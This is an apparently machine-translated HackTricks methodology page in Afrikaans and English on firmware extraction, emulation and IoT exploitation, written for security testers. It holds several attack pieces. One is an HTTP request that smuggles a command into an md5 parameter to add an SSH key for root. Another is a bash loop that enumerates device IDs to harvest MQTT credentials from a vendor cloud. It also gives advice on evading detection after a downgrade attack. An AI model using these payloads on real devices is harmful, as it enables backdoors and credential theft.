# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te werk deur die kommunikasie tussen die hardeware-komponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente memory gestoor, wat verseker dat die device vanaf die oomblik dat dit aangeskakel word, toegang kan kry tot noodsaaklike instruksies, wat lei tot die launch van die operating system. Die ondersoek en moontlike aanpassing van firmware is 'n kritieke stap in die identifisering van security vulnerabilities.

## **Inligting insamel**

**Inligting insamel** is 'n kritieke aanvanklike stap om 'n device se samestelling en die technologies wat dit gebruik, te verstaan. Hierdie proses behels die insameling van data oor:

- Die CPU architecture en operating system wat dit run
- Bootloader besonderhede
- Hardware layout en datasheets
- Codebase metrics en source locations
- External libraries en license tipes
- Update histories en regulatory certifications
- Architectural en flow diagrams
- Security assessments en geïdentifiseerde vulnerabilities

Vir hierdie doel is **open-source intelligence (OSINT)** tools van onskatbare waarde, asook die analysis van enige beskikbare open-source software components deur handmatige en outomatiese review processes. Tools soos [Coverity Scan](https://scan.coverity.com) en [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis static analysis wat benut kan word om moontlike issues te vind.

## **Firmware verkry**

Om firmware te verkry kan op verskeie maniere benader word, elk met sy eie vlak van complexity:

- **Direk** vanaf die source (developers, manufacturers)
- Dit **build** vanaf die verskafde instructions
- **Download** vanaf official support sites
- Gebruik **Google dork** queries om gehoste firmware files te vind
- Toegang tot **cloud storage** direk, met tools soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Intercepting updates** via man-in-the-middle techniques
- **Extracting** vanaf die device deur connections soos **UART**, **JTAG**, of **PICit**
- **Sniffing** vir update requests binne device communication
- Identifiseer en gebruik **hardcoded update endpoints**
- **Dumping** vanaf die bootloader of network
- **Verwyder en lees** die storage chip, wanneer alles anders faal, met toepaslike hardware tools

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analysing the firmware

Now that you **have the firmware**, you need to extract information about it to know how to treat it. Different tools you can use for that:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie veel met daardie tools vind nie, kyk na die **entropy** van die image met `binwalk -E <bin>`. As dit lae entropy het, dan is dit waarskynlik nie encrypted nie. As dit hoë entropy het, is dit waarskynlik encrypted (of op een of ander manier compressed).

Verder kan jy hierdie tools gebruik om **files embedded inside the firmware** uit te trek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die file te inspekteer.

### Getting the Filesystem

Met die vorige gecommentde tools soos `binwalk -ev <bin>` moes jy reeds die **filesystem extracted** hê.\
Binwalk extract dit gewoonlik binne ’n **folder named as the filesystem type**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Soms sal binwalk **nie die magic byte van die filesystem in sy signatures hê nie**. In hierdie gevalle, gebruik binwalk om **die offset of the filesystem te vind** en die compressed filesystem uit die binary te carve en die filesystem **manually extract** volgens sy tipe met die stappe hieronder.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit om die Squashfs filesystem uit te kerf.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende opdrag ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Vir squashfs (gebruik in die voorbeeld hierbo)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die "`squashfs-root`" gids wees.

- CPIO-argief lêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2 lêersisteme

`$ jefferson rootfsfile.jffs2`

- Vir ubifs lêersisteme met NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analyzing Firmware

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en moontlike kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie tools om die firmware-afbeelding te analiseer en waardevolle data daaruit te onttrek.

### Initial Analysis Tools

'n Stel opdragte word voorsien vir aanvanklike inspeksie van die binêre lêer (verwys as `<bin>`). Hierdie opdragte help om lêertipes te identifiseer, strings te onttrek, binêre data te analiseer, en die partisie- en lêersisteembesonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsiestatus van die image te beoordeel, word die **entropy** nagegaan met `binwalk -E <bin>`. Lae entropy dui op ’n gebrek aan enkripsie, terwyl hoë entropy moontlike enkripsie of kompressie aandui.

Vir die onttrekking van **embedded files**, word tools en resources soos die **file-data-carving-recovery-tools** dokumentasie en **binvis.io** vir lêer-inspeksie aanbeveel.

### Uittrek van die Filesystem

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die filesystem onttrek, dikwels in ’n directory genoem na die filesystem-tipe (bv. squashfs, ubifs). Wanneer **binwalk** egter nie die filesystem-tipe herken nie weens ontbrekende magic bytes, is handmatige onttrekking nodig. Dit behels die gebruik van `binwalk` om die filesystem se offset te vind, gevolg deur die `dd` command om die filesystem uit te sny:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangende van die filesystem-tipe (bv. squashfs, cpio, jffs2, ubifs), word verskillende commands gebruik om die inhoud handmatig uit te haal.

### Filesystem Analysis

Sodra die filesystem uitgehaal is, begin die soektog na security flaws. Daar word gelet op insecure network daemons, hardcoded credentials, API endpoints, update server functionalities, uncompiled code, startup scripts, en compiled binaries vir offline analysis.

**Belangrike liggings** en **items** om te inspekteer sluit in:

- **etc/shadow** en **etc/passwd** vir user credentials
- SSL certificates en keys in **etc/ssl**
- Configuration- en script-lêers vir moontlike vulnerabilities
- Embedded binaries vir verdere analysis
- Algemene IoT device web servers en binaries

Verskeie tools help om sensitive information en vulnerabilities binne die filesystem te ontbloot:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir sensitive information search
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), en [**EMBA**](https://github.com/e-m-b-a/emba) vir static en dynamic analysis

### Security Checks on Compiled Binaries

Beide source code en compiled binaries wat in die filesystem gevind word, moet vir vulnerabilities ondersoek word. Tools soos **checksec.sh** vir Unix binaries en **PESecurity** vir Windows binaries help om unprotected binaries te identifiseer wat uitgebuit kan word.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Baie IoT hubs haal hul per-device configuration vanaf ’n cloud endpoint wat lyk soos:

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware analysis mag jy vind dat `<token>` plaaslik van die device ID afgelei word met behulp van ’n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) en voorgestel as uppercase hex

Hierdie design stel enigiemand wat ’n deviceId en die STATIC_KEY ontdek in staat om die URL te rekonstrueer en cloud config af te trek, wat dikwels plaintext MQTT credentials en topic prefixes openbaar.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Soek vir lyne wat die cloud config URL-patroon en broker-adres druk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai binaries in Ghidra/radare2 en soek vir die config path ("/pf/") of MD5-gebruik.
- Bevestig die algoritme (bv. MD5(deviceId||STATIC_KEY)).
- Lei die token af in Bash en maak die digest uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Oes cloud config en MQTT credentials

- Stel die URL saam en trek JSON met curl; parseer met jq om secrets te onttrek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herstelde credentials om op maintenance topics in te teken en kyk vir sensitiewe events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Lys voorspelbare toestel-ID's (op skaal, met magtiging)

- Baie ekosisteme bevat vendor OUI/product/tipe-bytes gevolg deur 'n opeenvolgende suffiks.
- Jy kan kandidaat-ID's iterer, tokens aflei en configs programmaties haal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Verkry altyd uitdruklike magtiging voordat jy mass enumeration probeer.
- Verkies emulation of static analysis om secrets te herstel sonder om target hardware te wysig wanneer moontlik.


Die proses om firmware te emuleer maak **dynamic analysis** moontlik van óf ’n toestel se werking óf ’n individuele program. Hierdie benadering kan uitdagings met hardware- of architecture-afhanklikhede ondervind, maar die oordrag van die root filesystem of spesifieke binaries na ’n toestel met ooreenstemmende architecture en endianness, soos ’n Raspberry Pi, of na ’n voorafgeboude virtual machine, kan verdere toetsing vergemaklik.

### Emulating Individual Binaries

Vir die ondersoek van enkel programs, is die identifisering van die program se endianness en CPU architecture noodsaaklik.

#### Example with MIPS Architecture

Om ’n binary met MIPS architecture te emuleer, kan ’n mens die command gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-gereedskap te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sou `qemu-mipsel` die keuse wees.

#### ARM Architecture Emulation

Vir ARM binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulation gebruik word.

### Full System Emulation

Tools soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander, fasiliteer full firmware emulation, en outomatiseer die proses en help met dynamic analysis.

## Dynamic Analysis in Practice

Op hierdie stadium word óf ’n regte óf ’n geëmuleerde device environment vir analysis gebruik. Dit is noodsaaklik om shell access tot die OS en filesystem te behou. Emulation mag nie hardware interactions perfek naboots nie, wat af en toe emulation restarts noodsaaklik maak. Analysis moet die filesystem weer besoek, exposed webpages en network services exploit, en bootloader vulnerabilities verken. Firmware integrity tests is krities om potensiële backdoor vulnerabilities te identifiseer.

## Runtime Analysis Techniques

Runtime analysis behels interaksie met ’n process of binary in sy operating environment, met behulp van tools soos gdb-multiarch, Frida, en Ghidra vir die stel van breakpoints en die identifisering van vulnerabilities deur fuzzing en ander techniques.

Vir embedded targets sonder ’n full debugger, **copy a statically-linked `gdbserver`** na die device en attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Op IoT hubs word die RF-stapel dikwels verdeel tussen ’n **radio MCU** en ’n Linux userland process. ’n Nuttige workflow is om die pad te map:

1. **RF frame** in die lug
2. **controller-side parser** op die radio MCU
3. **serial/UART text or TLV protocol** wat na Linux deurgestuur word (byvoorbeeld `/dev/tty*`)
4. **application dispatcher** in die main daemon
5. **protocol-specific handler / state machine**

Hierdie architecture skep twee reversing targets in plaas van een. As die controller binêre radio frames omskakel na ’n teksprotocol soos `Group,Command,arg1,arg2,...`, herstel:

- Die **message groups** en dispatch tables
- Watter messages van die **network** kan kom versus die controller self
- Die presiese **manufacturer-specific discriminator fields** (byvoorbeeld Zigbee `manufacturer_code` en custom `cluster_command`)
- Watter handlers slegs bereikbaar is tydens **commissioning**, discovery, of firmware/model download fases

Vir Zigbee spesifiek, capture pairing traffic en kyk of die target steeds op die verstek **Link Key** `ZigBeeAlliance09` staatmaak. Indien wel, kan sniffing van commissioning traffic die **Network Key** blootstel. Zigbee 3.0 install codes verminder hierdie exposure, so let op of die getoetste device dit werklik afdwing.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands is dikwels ’n beter target as standardized clusters omdat hulle **custom parsing code** en interne **FSMs** voed met minder battle-tested validation.

Praktiese workflow:

- Reverse die command dispatcher totdat jy die **vendor-only handler** vind.
- Herstel die **FSM state**, **event**, **check**, **action**, en **next-state** tables.
- Identifiseer **transitional states** wat auto-advance en retry/error branches wat uiteindelik attacker-controlled state reset of free.
- Bevestig watter legit protocol exchanges nodig is om die daemon in die vulnerable state te plaas eerder as om aan te neem die buggy handler is altyd bereikbaar.

Vir timing-sensitive protocols, kan packet replay vanaf ’n Python framework te stadig wees. ’n Meer betroubare benadering is om ’n legit device op regte hardware te emuleer (byvoorbeeld ’n **nRF52840**) met ’n vendor-grade stack sodat jy die korrekte **endpoints**, **attributes**, en commissioning timing kan blootstel.

### Fragmented-download bug class in embedded daemons

’n Herhalende firmware bug class verskyn in **fragmented blob/model/configuration downloads**:

1. Die **first fragment** (`offset == 0`) stoor `ctx->total_size` en allokeer `malloc(total_size)`.
2. Later fragments valideer slegs die attacker-controlled **packet-local** fields soos `packet_total_size >= offset + chunk_len`.
3. Die copy gebruik `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sonder om teen die **original allocated size** te kontroleer.

Dit laat ’n attacker toe om te stuur:

- ’n Eerste geldige fragment met ’n **small** verklaarde total size om ’n klein heap allocation af te dwing.
- ’n Later fragment met die **expected offset** maar ’n groter `chunk_len`.
- ’n Forged packet-local size wat die vars checks slaag terwyl dit steeds die oorspronklik geallokeerde buffer oorloop.

Wanneer die vulnerable path agter commissioning logic sit, moet exploit genoeg **device emulation** insluit om die target in die verwagte model-download of blob-download state te dryf voor die malformed fragments gestuur word.

### Protocol-driven `free()` triggers

In embedded daemons is die maklikste manier om heap metadata exploitation te trigger dikwels nie "wag vir cleanup" nie maar **force the protocol's own error handling**:

- Stuur malformed follow-up fragments om die FSM in **retry** of **error** states te stoot.
- Oorskry die retry threshold sodat die daemon **resets context** en die corrupted buffer free.
- Gebruik hierdie voorspelbare `free()` om allocator-side primitives te trigger voordat die process om onverwante redes crash.

Dit is veral nuttig teen **musl/uClibc/dlmalloc-like** allocators in embedded Linux, waar die korruptering van chunk metadata unlink/unbin logic in ’n write primitive kan verander. ’n Stabiele patroon is om ’n **size field** te korrupteer om allocator traversal na **fake chunks staged inside the overflowed buffer** te herlei, in plaas daarvan om dadelik regte bin pointers te verbrysel en die process te laat crash.

## Binary Exploitation and Proof-of-Concept

Om ’n PoC vir geïdentifiseerde vulnerabilities te ontwikkel, vereis ’n diep begrip van die target architecture en programmering in laer-vlak tale. Binary runtime protections in embedded systems is skaars, maar wanneer dit teenwoordig is, kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc gebruik fastbins soortgelyk aan glibc. ’n Latere groot allocation kan `__malloc_consolidate()` trigger, so enige fake chunk moet checks oorleef (sane size, `fd = 0`, en omliggende chunks wat as "in use" gesien word).
- **Non-PIE binaries under ASLR:** as ASLR enabled is maar die main binary **non-PIE** is, is in-binary `.data/.bss` addresses stabiel. Jy kan ’n area teiken wat reeds soos ’n geldige heap chunk header lyk om ’n fastbin allocation op ’n **function pointer table** te land.
- **Parser-stopping NUL:** wanneer JSON geparse word, kan ’n `\x00` in die payload parsing stop terwyl trailing attacker-controlled bytes vir ’n stack pivot/ROP chain behou word.
- **Shellcode via `/proc/self/mem`:** ’n ROP chain wat `open("/proc/self/mem")`, `lseek()`, en `write()` aanroep, kan executable shellcode in ’n bekende mapping plaas en daarnaartoe spring.

## Prepared Operating Systems for Firmware Analysis

Operating systems soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied pre-configured environments vir firmware security testing, toegerus met nodige tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is ’n distro bedoel om jou te help om security assessment en penetration testing van Internet of Things (IoT) devices uit te voer. Dit spaar jou baie tyd deur ’n pre-configured environment met al die nodige tools gelaai te voorsien.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system gebaseer op Ubuntu 18.04, vooraf gelaai met firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Selfs wanneer ’n vendor cryptographic signature checks vir firmware images implementeer, word **version rollback (downgrade) protection** dikwels weggelaat. Wanneer die boot- of recovery-loader slegs die signature met ’n embedded public key verifieer maar nie die *version* (of ’n monotonic counter) van die image wat geflas word vergelyk nie, kan ’n attacker wettig ’n **older, vulnerable firmware wat steeds ’n geldige signature dra** installeer en so gepatchte vulnerabilities weer invoer.

Tipiese attack workflow:

1. **Obtain an older signed image**
* Haal dit van die vendor se publieke download portal, CDN of support site af.
* Extract dit uit companion mobile/desktop applications (bv. binne ’n Android APK onder `assets/firmware/`).
* Retrieve dit van third-party repositories soos VirusTotal, Internet archives, forums, ens.
2. **Upload or serve the image to the device** via enige blootgestelde update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, ens.
* Baie consumer IoT devices stel *unauthenticated* HTTP(S) endpoints bloot wat Base64-encoded firmware blobs aanvaar, dit server-side decode en recovery/upgrade trigger.
3. Na die downgrade, exploit ’n vulnerability wat in die nuwer release gepatch is (byvoorbeeld ’n command-injection filter wat later bygevoeg is).
4. Optionally flash die nuutste image terug of disable updates om detection te vermy sodra persistence verkry is.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (afgradeerde) firmware word die `md5`-parameter direk aan ’n shell-opdrag gekoppel sonder sanitering, wat invoeging van arbitrêre opdragte moontlik maak (hier – die aktivering van SSH key-based root access). Latere firmware- weergawes het ’n basiese karakterfilter bekendgestel, maar die afwesigheid van downgrade protection maak die regstelling nutteloos.

### Extracting Firmware From Mobile Apps

Baie vendors bundel volledige firmware-images binne hul companion mobile applications sodat die app die device oor Bluetooth/Wi-Fi kan update. Hierdie packages word algemeen onencrypted in die APK/APEX gestoor onder paths soos `assets/fw/` of `res/raw/`. Tools soos `apktool`, `ghidra`, of selfs plain `unzip` laat jou toe om signed images uit te haal sonder om aan die physical hardware te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolelys vir die Assesseer van Update Logic

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die device **versienommers** of ’n **monotonic anti-rollback counter** voor flashing?
* Word die image binne ’n secure boot chain geverifieer (bv. signatures wat deur ROM code nagegaan word)?
* Voer userland code addisionele sanity checks uit (bv. toegelate partition map, model number)?
* Gebruik *partial* of *backup* update flows dieselfde validation logic weer?

> 💡  As enige van die bogenoemde ontbreek, is die platform waarskynlik kwesbaar vir rollback attacks.

## Vulnerable firmware om te oefen

Om te oefen om vulnerabilities in firmware te ontdek, gebruik die volgende vulnerable firmware projects as ’n beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
